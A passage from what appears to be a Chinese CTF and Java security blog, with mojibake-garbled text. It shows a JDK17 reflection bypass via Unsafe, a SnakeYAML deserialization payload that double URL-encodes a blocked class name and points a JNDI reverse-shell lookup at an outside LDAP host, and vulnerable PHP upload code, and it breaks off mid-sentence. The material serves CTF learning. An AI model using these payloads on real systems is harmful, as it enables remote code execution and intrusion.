javassist.*; public class Main { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); CtConstructor constructor = new CtConstructor(new CtClass[]{}, cc); constructor.setBody(\u0026#34;{ try {\\n\u0026#34; + \u0026#34; Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\\n\u0026#34; + \u0026#34; } catch (Exception e) {\\n\u0026#34; + \u0026#34; System.exit(0);\\n\u0026#34; + \u0026#34; } }\u0026#34;); cc.addConstructor(constructor); byte[] classBytes = cc.toBytecode(); patchModule(Main.class); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Evil\u0026#34;, classBytes, 0, classBytes.length); clazz.newInstance(); } private static void patchModule(Class clazz) throws Exception { Field field = Unsafe.class.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); field.setAccessible(true); Unsafe unsafe = (Unsafe) field.get(null); long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); Module targetModule = Object.class.getModule(); unsafe.getAndSetObject(clazz, offset,targetModule); } } è¿è¡ŒæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nå…¶å®å°±æ˜¯å°†å½“å‰è¿è¡Œçš„ç±»çš„æ¨¡å—ä½ç½®æ”¹å¾—å’ŒObject.classçš„ä¸€æ ·ï¼Œè¿™æ ·å°±èƒ½æ— è®ºåå°„è¦è°ƒç”¨çš„ç±»æ˜¯ä»€ä¹ˆï¼Œéƒ½èƒ½æˆåŠŸåå°„è°ƒç”¨ã€‚\nå¹¶ä¸”Unsafeä¸­è¿˜æœ‰å¾ˆå¤šå¯ä»¥åˆ©ç”¨ï¼Œæ¯”å¦‚putObject()å‡½æ•°ä¹Ÿå¯ä»¥ä¿®æ”¹ï¼Œè¿˜å¯ä»¥ç›´æ¥ä½¿ç”¨jdk.internal.misc.Unsafeæ­¤è·¯å¾„ä¸‹çš„Unsafeï¼Œå› ä¸ºsun.misc.Unsafeæœ¬è´¨å…¶å®å°±æ˜¯è°ƒç”¨çš„è¿™ä¸ªç±»çš„æ–¹æ³•è¿›è¡Œçš„è·å–ä»¥åŠä¿®æ”¹ï¼š\nåç»­é‡åˆ°å†è¯´ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B\nhttps://stoocea.github.io/post/JDK%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%B0%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87.html#JDK9%E4%B9%8B%E5%90%8E%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96\nhttps://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/\nhttps://blog.csdn.net/weixin_36123300/article/details/147782120\n","date":"2025-09-07T18:42:45+08:00","permalink":"https://fupanc-w1n.github.io/p/jdk17%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/","title":"JDK17ä¸‹çš„åå°„ç»•è¿‡"},{"content":"WEB è¿™æ¬¡æ¯”èµ›è™½ç„¶å¤§éƒ¨åˆ†éƒ½æ˜¯å›½å¤–çš„åŸé¢˜ï¼Œä½†æ˜¯éƒ½æ˜¯æˆ‘æ²¡åšè¿‡çš„ï¼Œè¿™é‡Œå°±ç®€å•è®°å½•ä¸€ä¸‹å½“æ—¶è‡ªå·±åšè¿‡çš„å¹¶ä¸”æœ‰æ„æ€çš„é¢˜ã€‚\nEzYaml æ„Ÿè§‰åˆæ˜¯snakeyamlååºåˆ—åŒ–ï¼Œä¸‹è½½æ‹¿åˆ°jaråŒ…åä¾¿ç¼–è¯‘ï¼Œspringbootï¼Œæœ‰å¦‚ä¸‹ä¾èµ–ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 - \u0026#34;BOOT-INF/lib/spring-boot-2.7.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-2.7.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.2.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.2.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-1.30.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.13.4.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/lombok-1.18.24.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-layertools-2.7.5.jar\u0026#34; å¯ä»¥çœ‹åˆ°å­˜åœ¨snakeyamlä¾èµ–ï¼Œå†çœ‹è·¯ç”±ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @PostMapping({\u0026#34;/config\u0026#34;}) @ResponseBody public HashMap\u0026lt;String, String\u0026gt; config(String yaml) { HashMap\u0026lt;String, String\u0026gt; configMap = new HashMap\u0026lt;\u0026gt;(); if (!Common.isValid(yaml) || yaml.isEmpty()) { yaml = Common.exampleConfig; } Yaml parse = new Yaml(); Object config = parse.load(yaml); Method[] methods = config.getClass().getDeclaredMethods(); for (Method method : methods) { String name = method.getName(); if (name.startsWith(BeanUtil.PREFIX_GETTER_GET) \u0026amp;\u0026amp; method.getParameterCount() == 0 \u0026amp;\u0026amp; name.length() \u0026gt; 3) { try { configMap.put(name.substring(3), method.invoke(config, new Object[0]).toString()); } catch (Exception e) { } } } return configMap; } å¯ä»¥çœ‹åˆ°å­˜åœ¨snakeyamlååºåˆ—åŒ–æ¼æ´ï¼Œåªä¸è¿‡å¯¹å†…å®¹è¿›è¡Œäº†æ£€æµ‹ï¼Œè·Ÿè¿›è‡ªå®šä¹‰çš„Commonç±»çš„isValid()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.ctf.yamlconfig.util; import org.springframework.beans.PropertyAccessor; /* loaded from: yaml.jar:BOOT-INF/classes/com/ctf/yamlconfig/util/Common.class */ public class Common { public static final String exampleConfig = \u0026#34;!!com.ctf.yamlconfig.config.DataSourceConfig {\\n host: 127.0.0.1,\\n port: 3306,\\n username: SilentE,\\n password: 123456,\\n database: Test,\\n type: mysql,\\n params: \\\u0026#34;characterEncoding=utf-8\u0026amp;serverTimezone=GMT\u0026amp;useUnicode=true\\\u0026#34;\\n}\u0026#34;; public static boolean isValid(String origin) { if (origin.contains(PropertyAccessor.PROPERTY_KEY_PREFIX) || origin.contains(\u0026#34;]\u0026#34;) || origin.contains(\u0026#34;ScriptEngineManager\u0026#34;) || origin.contains(\u0026#34;InputStream\u0026#34;) || origin.contains(\u0026#34;OutputStream\u0026#34;) || origin.contains(\u0026#34;JdbcRowSetImpl\u0026#34;) || origin.contains(\u0026#34;jndi\u0026#34;) || origin.contains(\u0026#34;javax.naming\u0026#34;)) { return false; } return true; } } å¯ä»¥çœ‹åˆ°æ˜¯è¿‡æ»¤äº†æˆ‘ä»¬æ¯”è¾ƒå¸¸æ‰“çš„JdbcRowSetImplå’Œä¸­æ‹¬å·ï¼Œåé¢çœ‹wpæ˜¯åœ¨ä¼ å‚æ—¶ä½¿ç”¨åŒé‡urlç¼–ç ç»•è¿‡ï¼Œä¸æ˜¯å¾ˆæ‡‚ä¸ºä»€ä¹ˆï¼Œè¿™é‡Œåˆæ²¡æœ‰ssrfæ‰€ä»¥ä¸ä¼šå†æ¬¡urlè§£ç ï¼Œéš¾é“æ˜¯snakeyamlåœ¨load()æ—¶ä¼šè‡ªåŠ¨urlè§£ç ä¸€æ¬¡ï¼Ÿè¿™æ˜¯ä¸€ç§ç‰¹æ€§ï¼Ÿ\nå…ˆæ‰“å‡ºflagï¼Œç›´æ¥æ‰“jndiå³å¯ï¼š\n1 !!com.sun.rowset.%25%34%61dbcRowSetImpl+{dataSourceName%3a+\u0026#34;ldap%3a//47.100.223.173%3a1389/Deserialize/Jackson/ReverseShell/47.100.223.173/2333\u0026#34;,+autoCommit%3a+true} æŠŠJåŒé‡ç¼–ç äº†ï¼š\njndiæ‰“jacksonååºåˆ—åŒ–ï¼Œè¿‡ç¨‹ä¸å¤šè¯´äº†ï¼Œç”¨çš„JndiMapå·¥å…·ï¼Œæœ€åæ‹¿åˆ°flagçš„æ•ˆæœå¦‚ä¸‹ï¼š\nflagå¦‚ä¸‹ï¼š\n1 flag{zhuaWa_j1aWa_zh@Wa} â€”â€”â€”â€”â€”â€”â€”â€”\nç°åœ¨æ¥ç®€å•è°ƒè¯•ä¸€ä¸‹è¿‡ç¨‹ï¼š\næœ¬åœ°æ­å»ºå¥½ç¯å¢ƒåå¼€å§‹è°ƒè¯•ï¼š\nå¯ä»¥çœ‹åˆ°ç¡®å®åœ¨æ­¤æ—¶åªè¿›è¡Œäº†ä¸€æ¬¡urlè§£ç ï¼Œæ•…è¿™é‡Œçš„Jè¿˜ä¿æŒç€urlç¼–ç çš„æ ¼å¼ã€‚ç„¶åå°±ä¼šè¿›å…¥æ­£å¸¸çš„Yamlçš„load()éƒ¨åˆ†ï¼š\nåœ¨æ¼«é•¿çš„è°ƒè¯•ä¸­ï¼Œæœ€åæ‰¾åˆ°äº†å®ç°ä»£ç ï¼Œåœ¨ä¸€æ¬¡è°ƒè¯•ä¸­ï¼Œçœ‹åˆ°tagå®ç°äº†å·²ç»è§£ç çš„æ ‡ç­¾ï¼š\næ­¤æ—¶çš„è°ƒç”¨æ ˆä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 parseNode:489, ParserImpl (org.yaml.snakeyaml.parser) access$1400:121, ParserImpl (org.yaml.snakeyaml.parser) produce:395, ParserImpl$ParseBlockNode (org.yaml.snakeyaml.parser) peekEvent:166, ParserImpl (org.yaml.snakeyaml.parser) peek:59, CommentEventsCollector$1 (org.yaml.snakeyaml.comments) peek:45, CommentEventsCollector$1 (org.yaml.snakeyaml.comments) collectEvents:140, CommentEventsCollector (org.yaml.snakeyaml.comments) collectEvents:119, CommentEventsCollector (org.yaml.snakeyaml.comments) composeNode:157, Composer (org.yaml.snakeyaml.composer) getNode:115, Composer (org.yaml.snakeyaml.composer) getSingleNode:142, Composer (org.yaml.snakeyaml.composer) getSingleData:151, BaseConstructor (org.yaml.snakeyaml.constructor) loadFromReader:491, Yaml (org.yaml.snakeyaml) load:416, Yaml (org.yaml.snakeyaml) å¾€å‰è¿½æº¯tagçš„å®ç°å¹¶æ‰“æ–­ç‚¹é‡æ–°è°ƒè¯•ï¼š\nè¿™é‡Œæ˜¯å…ˆä»tagTokenä¸­è·å–valueï¼Œç„¶åå†ä»ä¸­è·å–åˆ°suffixå¹¶æ‹¼æ¥æˆä¸ºtagï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„tagTokençš„å˜é‡çš„å€¼å·²ç»è§£ç äº†ï¼š\nè·Ÿè¿›getValue()æ–¹æ³•ï¼š\nè¿™é‡Œæ‰“ä¸€ä¸ªæ–­ç‚¹å¾€å‰æŸ¥çœ‹èµ‹å€¼æƒ…å†µï¼š å¯ä»¥çœ‹åˆ°å¯¹valueçš„èµ‹å€¼ä»¥åŠTagTokençš„å®ä¾‹åŒ–ï¼Œåˆ†æå‰é¢çš„ä»£ç ï¼Œçœ‹åˆ°å¯¹suffixèµ‹å€¼è°ƒç”¨äº†ä¸€ä¸ªscanTagUri()æ–¹æ³•ï¼Œè·Ÿè¿›æŸ¥çœ‹ï¼š\næ³¨é‡Šä¸­æœ‰å¯¹è¿™ä¸ªscanTagUri()æ–¹æ³•çš„è¯´æ˜ï¼š\næ‰«ææ ‡ç­¾ä¸­çš„URIï¼Œå…¶å®å°±æ˜¯å¯¹å…¶ä¸­è¿›è¡Œäº†urlç¼–ç çš„å­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œè¿™ä¸ªæ–¹æ³•çš„é€»è¾‘å°±æ˜¯åˆ©ç”¨chunkæ¥å‚¨å­˜å­—ç¬¦ï¼Œå½“é‡åˆ°%å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯urlç¼–ç äº†ï¼Œå°±ä¼šå…ˆå°†å‰é¢ç´¯è®¡çš„æ™®é€šå­—ç¬¦å†™å…¥chunksï¼Œç„¶åå†å†™å…¥urlè§£ç åçš„å­—ç¬¦ã€‚å…³é”®ç‚¹å°±åœ¨äºä¸Šæ–‡æ ‡è®°å‡ºæ¥çš„scanUriEscapes()æ–¹æ³•ï¼š\nå…³é”®çš„è§£ç çš„åœ°æ–¹å°±æ˜¯å¦‚ä¸‹ï¼š\n1 2 byte code = (byte) Integer.parseInt(reader.prefix(2), 16); buff.put(code); è¿™é‡Œå°±æ˜¯è¯»å–%åé¢ä¸¤ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ï¼Œç„¶åå°†å…¶è½¬æ¢æˆå­—èŠ‚ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œçš„Jå°±æ˜¯%4aï¼Œé‚£ä¹ˆå°±æ˜¯0x4aï¼Œå¯¹åº”asciiå°±æ˜¯Jï¼š\nåé¢å†è°ƒç”¨UriEncoder.decodeå°†å…¶è§£ç æˆå­—ç¬¦å¹¶è¿”å›ï¼Œç„¶åå°±æ”¾å…¥åˆ°chunksä¸­ï¼Œæœ€åè°ƒç”¨chunks.toString()è¿”å›ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›èµ‹å€¼ï¼š\nè¿‡ç¨‹å¦‚ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹æ ‡ç­¾è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼Œä»è€Œè¾¾åˆ°ç»•è¿‡çš„æ•ˆæœã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\næœ€åï¼Œå€¼å¾—ä¸€æçš„æ˜¯è™½ç„¶åœ¨å‚æ•°ä¼ é€’æ—¶ä¼ å…¥äº†startMarkï¼š\nä½†æ˜¯ä½†æ˜¯ä¸»è¦èµ·ä½œç”¨çš„è¿˜æ˜¯ç›´æ¥ä»readerä¸­è·å–çš„ï¼š\næ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼š\nè€Œreaderå­˜å‚¨çš„å…¶å®å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ï¼š\nè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 scanTagUri:2291, ScannerImpl (org.yaml.snakeyaml.scanner) scanTag:1620, ScannerImpl (org.yaml.snakeyaml.scanner) fetchTag:995, ScannerImpl (org.yaml.snakeyaml.scanner) fetchMoreTokens:414, ScannerImpl (org.yaml.snakeyaml.scanner) checkToken:251, ScannerImpl (org.yaml.snakeyaml.scanner) produce:214, ParserImpl$ParseImplicitDocumentStart (org.yaml.snakeyaml.parser) peekEvent:166, ParserImpl (org.yaml.snakeyaml.parser) checkEvent:156, ParserImpl (org.yaml.snakeyaml.parser) getSingleNode:141, Composer (org.yaml.snakeyaml.composer) getSingleData:151, BaseConstructor (org.yaml.snakeyaml.constructor) loadFromReader:491, Yaml (org.yaml.snakeyaml) load:416, Yaml (org.yaml.snakeyaml) åé¢å‘ç°è¿™æ˜¯ä¸€ä¸ªtrickï¼š\nhttps://liotree.github.io/2025/02/09/spel%E6%B3%A8%E5%85%A5%E5%92%8Csnakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96waf%20bypass%20trick/\nEzReveal ç»™äº†é™„ä»¶ï¼Œä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 \u0026lt;?php define(\u0026#39;REL_FILENAME\u0026#39;, \u0026#39;word/_rels/document.xml.rels\u0026#39;); function reSponYour($code, $msg) { http_response_code($code); die($msg); } /* sanity checks */ if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] !== \u0026#39;POST\u0026#39;) reSponYour(405, \u0026#39;Invalid request method.\u0026#39;); if (!isset($_FILES[\u0026#39;input\u0026#39;])) reSponYour(400, \u0026#39;Please upload a file.\u0026#39;); if (isset($_FILES[\u0026#39;input\u0026#39;]) \u0026amp;\u0026amp; $_FILES[\u0026#39;input\u0026#39;][\u0026#39;error\u0026#39;] !== UPLOAD_ERR_OK) reSponYour(500, \u0026#39;Upload error.\u0026#39;); if ($_FILES[\u0026#39;input\u0026#39;][\u0026#39;type\u0026#39;] != \u0026#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document\u0026#39;) reSponYour(400, \u0026#39;Please upload a Word document!\u0026#39;); /* processing uploaded Word - valid document contains relationship table */ $zip = new ZipArchive(); $zipFilename = $_FILES[\u0026#39;input\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if ($zip-\u0026gt;open($zipFilename) !== true || $zip-\u0026gt;locateName(REL_FILENAME) === false) reSponYour(400, \u0026#39;File is not a valid Word document.\u0026#39;); $relsDom = simplexml_load_string($zip-\u0026gt;getFromName(REL_FILENAME)); if ($relsDom === false) reSponYour(400, \u0026#39;Invalid object relationship table. Document may be corrupted.\u0026#39;); /* extract document\u0026#39;s \u0026#34;media\u0026#34; folder into a temporary directory */ $tmpDir = exec(\u0026#34;mktemp -d --tmpdir=/tmp/ zipXXXXXX\u0026#34;); shell_exec(\u0026#34;unzip $zipFilename \\\u0026#34;word/media*\\\u0026#34; -d \\\u0026#34;$tmpDir\\\u0026#34;\u0026#34;); function cleanup($tmpDir) { shell_exec(\u0026#34;rm -rf $tmpDir\u0026#34;); } register_shutdown_function(\u0026#39;cleanup\u0026#39;, $tmpDir); // cleanup in the end chdir(\u0026#34;$tmpDir/word/media\u0026#34;); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;.\u0026#39;); $messages = []; foreach($relsDom-\u0026gt;Relationship as $rel) { if($rel[\u0026#39;Type\u0026#39;] == \u0026#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#39;) { if (!str_starts_with($rel[\u0026#39;Target\u0026#39;], \u0026#39;media/\u0026#39;)) continue; $filename = substr($rel[\u0026#39;Target\u0026#39;], 6); $file = @file_get_contents($filename); if ($file === false) // Object relationship table points to inexistent file. Document may be corrupted break; $result = @zlib_decode($file); // This will expose them hackers! if ($result !== false) $messages[] = $result; } } // cleanup system(\u0026#34;rm -rf $tmpDir\u0026#34;); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;zStego - Results\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;./bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-light\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container text-center mt-5\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;display-4\u0026#34;\u0026gt;Scan Results\u0026lt;/h1\u0026gt; \u0026lt;?php if (!empty($messages)): ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-success mt-4\u0026#34;\u0026gt; \u0026lt;h4\u0026gt;Hidden Messages Found:\u0026lt;/h4\u0026gt; \u0026lt;ul class=\u0026#34;list-group\u0026#34;\u0026gt; \u0026lt;?php foreach ($messages as $message): ?\u0026gt; \u0026lt;li class=\u0026#34;list-group-item\u0026#34;\u0026gt; \u0026lt;?= htmlspecialchars($message) ?\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;?php endforeach; ?\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php else: ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-info mt-4\u0026#34;\u0026gt;No hidden messages found.\u0026lt;/div\u0026gt; \u0026lt;?php endif; ?\u0026gt; \u0026lt;a href=\u0026#34;index.php\u0026#34; class=\u0026#34;btn btn-secondary mt-3\u0026#34;\u0026gt;Back to Home\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ä¸»è¦ä»£ç é€»è¾‘å¯ä»¥çœ‹åˆ°æ˜¯å¦‚ä¸Šçš„ï¼Œæ˜¯ä¸€ä¸ªå¤„ç†æ–‡ä»¶ä¸Šä¼ çš„ä»£ç é€»è¾‘ï¼Œä»ä¸­å¯ä»¥çœ‹åˆ°å¯¹æ–‡ä»¶ä¸Šä¼ çš„åŒ…è¿›è¡Œäº†ä¸€äº›å¤„ç†ï¼Œæ¯”å¦‚è¦æ±‚ä¸ºPOSTä¼ å‚ï¼Œéœ€è¦inputå˜é‡å¹¶ä¸”è¦æ±‚ä¸Šä¼ çš„æ–‡ä»¶çš„Content-Typeéœ€è¦ä¸ºapplication/vnd.openxmlformats-officedocument.wordprocessingml.documentï¼Œä¹Ÿå°±æ˜¯wordæ–‡æ¡£çš„å†…å®¹ï¼Œå†çœ‹åç»­é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 $zip = new ZipArchive(); $zipFilename = $_FILES[\u0026#39;input\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if ($zip-\u0026gt;open($zipFilename) !== true || $zip-\u0026gt;locateName(REL_FILENAME) === false) reSponYour(400, \u0026#39;File is not a valid Word document.\u0026#39;); $relsDom = simplexml_load_string($zip-\u0026gt;getFromName(REL_FILENAME)); if ($relsDom === false) reSponYour(400, \u0026#39;Invalid object relationship table. Document may be corrupted.\u0026#39;); å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†ZipArchive()æ¥å¯¹ä¸Šä¼ çš„wordæ–‡æ¡£è¿›è¡Œè§£å‹ï¼Œå¹¶ä¸”åšè¿‡miscçš„éƒ½çŸ¥é“ï¼Œwordæ–‡æ¡£éƒ½æ˜¯å¯ä»¥æ”¹æˆzipç„¶åè§£å‹æŸ¥çœ‹å†…å®¹çš„ï¼Œæ‰€ä»¥è¿™é‡Œå¾ˆåˆç†ï¼Œä½†æ˜¯åŒæ ·å‚¬ç”Ÿå‡ºä¸€ä¸ªä¸œè¥¿ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ zipæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹typeä¸ºæŒ‡å®šå†…å®¹å³å¯ã€‚\nç„¶åå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†locateName()è¦æ±‚è§£å‹åçš„æ–‡ä»¶åŒ…å«word/_rels/document.xml.relsæ–‡ä»¶ï¼Œè¿™ä¸ªå¯ä»¥åœ¨æˆ‘ä»¬è‡ªå®šä¹‰åœ¨zipåŒ…ä¸­å‹ç¼©ä¸€ä¸ªå³å¯ï¼Œç„¶åå¯¹document.xml.relsæ–‡ä»¶å†…å®¹è°ƒç”¨äº†simplexml_load_string()è¿›è¡Œäº†å¤„ç†ï¼Œæœ€å¼€å§‹ä»¥ä¸ºè¿™é‡Œè€ƒçš„ä¸€ä¸ªxxeï¼Œä½†æ˜¯ä»åé¢çš„ä»£ç é€»è¾‘çœ‹èµ·æ¥å‘ç°å¹¶ä¸æ˜¯ã€‚\nå†å¾€åé¢çœ‹å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶ç›®å½•ï¼Œç„¶åè°ƒç”¨unzipå°†ä¸Šä¼ çš„æ–‡ä»¶çš„word/mediaç›®å½•ä¸‹çš„æ–‡ä»¶è§£å‹åˆ°ä¸´æ—¶ç›®å½•ä¸‹ï¼š\n1 2 3 4 5 6 7 $tmpDir = exec(\u0026#34;mktemp -d --tmpdir=/tmp/ zipXXXXXX\u0026#34;); shell_exec(\u0026#34;unzip $zipFilename \\\u0026#34;word/media*\\\u0026#34; -d \\\u0026#34;$tmpDir\\\u0026#34;\u0026#34;); function cleanup($tmpDir) { shell_exec(\u0026#34;rm -rf $tmpDir\u0026#34;); } register_shutdown_function(\u0026#39;cleanup\u0026#39;, $tmpDir); // cleanup in the end chdir(\u0026#34;$tmpDir/word/media\u0026#34;); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;.\u0026#39;); ç„¶åè¿›å…¥å¯¹åº”ç›®å½•å¹¶è®¾ç½®äº†open_basedirã€‚åœ¨è¿™é‡Œæ˜¯ç›´æ¥å¯¹zipè¿›è¡Œçš„è§£å‹ç¼©çš„ï¼Œæ‰€ä»¥ä¸å¯é¿å…çš„å°±æ˜¯å­˜åœ¨ä¸€ä¸ªè½¯é“¾æ¥æ¼æ´ï¼Œå¹¶ä¸”ä»è¿™é‡Œçš„è¦æ±‚å¯ä»¥çœ‹å‡ºä¹Ÿéœ€è¦ä¸Šä¼ çš„zipæ–‡ä»¶ä¸­å­˜åœ¨word/mediaç›®å½•ï¼Œç„¶åæœ€å…³é”®çš„å¤„ç†å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $messages = []; foreach($relsDom-\u0026gt;Relationship as $rel) { if($rel[\u0026#39;Type\u0026#39;] == \u0026#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#39;) { if (!str_starts_with($rel[\u0026#39;Target\u0026#39;], \u0026#39;media/\u0026#39;)) continue; $filename = substr($rel[\u0026#39;Target\u0026#39;], 6); $file = @file_get_contents($filename); if ($file === false) // Object relationship table points to inexistent file. Document may be corrupted break; $result = @zlib_decode($file); // This will expose them hackers! if ($result !== false) $messages[] = $result; } } // cleanup system(\u0026#34;rm -rf $tmpDir\u0026#34;); è¿™é‡Œå¯¹æˆ‘ä»¬å‰é¢è·å–åˆ°çš„word/_rels/document.xml.relsæ–‡ä»¶å†…å®¹è¿›è¡Œäº†å¤„ç†ï¼Œå¯ä»¥çœ‹åˆ°éœ€è¦æ»¡è¶³ä¸€äº›æ¡ä»¶ï¼Œè¿™ä¸ªæˆ‘ä»¬ç›´æ¥è®©aiç»™å‡ºå³å¯ï¼š\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media/hack.png\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt; è¿™æ ·å°±ç¬¦åˆå‰é¢çš„ifæ¡ä»¶ï¼Œç„¶åå¯ä»¥çœ‹åˆ°å­˜åœ¨æ¼æ´ç‚¹çš„æ˜¯file_get_contents()å‡½æ•°ï¼Œå¹¶ä¸”ä»ç»™çš„æç¤ºæˆ–è€…dockerfileä¸­å¯ä»¥çœ‹åˆ°æ˜¯éœ€è¦è¯»å–æ 